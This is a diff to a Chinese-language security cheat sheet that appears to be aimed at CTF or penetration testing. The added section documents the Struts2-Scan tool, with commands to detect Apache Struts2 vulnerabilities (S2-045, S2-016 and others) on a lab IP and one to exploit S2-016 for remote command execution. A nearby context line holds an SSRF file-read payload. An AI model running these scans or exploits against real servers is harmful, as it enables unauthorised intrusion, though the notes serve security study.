@@ -3259,7 +3259,49 @@ http://xxx/testURL?url=%00file:///flag
 
 ##### Struts2-Scan
 
-目前测试该工具扫不了漏洞，使用说明可以自己找缓存的 README
+用法：先检测漏洞类型，再利用漏洞（共两步）
+
+###### [单个URL漏洞检测:](https://github.com/Vancomycin-g/Struts2Scan#单个url漏洞检测)
+
+```
+$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action
+
+ ____  _              _       ____    ____                  
+/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __  
+\___ \| __| '__| | | | __/ __| __) | \___ \ / __/ _` | '_ \ 
+ ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |
+|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|
+
+                                      Author By HatBoy        
+
+[+] 正在扫描URL:http://192.168.100.8:8080/index.action
+[*] ----------------results------------------
+[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-046
+[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-016
+[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-045
+[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-015
+[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-009
+[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-012
+```
+
+###### [批量漏洞检测:](https://github.com/Vancomycin-g/Struts2Scan#批量漏洞检测)
+
+```
+$ python3 Struts2Scan.py -f urls.txt
+```
+
+###### [POST数据:](https://github.com/Vancomycin-g/Struts2Scan#post数据)
+
+```
+$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin&email=admin&age={exp}
+```
+
+###### [指定漏洞名称利用:](https://github.com/Vancomycin-g/Struts2Scan#指定漏洞名称利用)
+
+```
+# 命令执行
+$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec
+```
 
 ## 数据外带
 
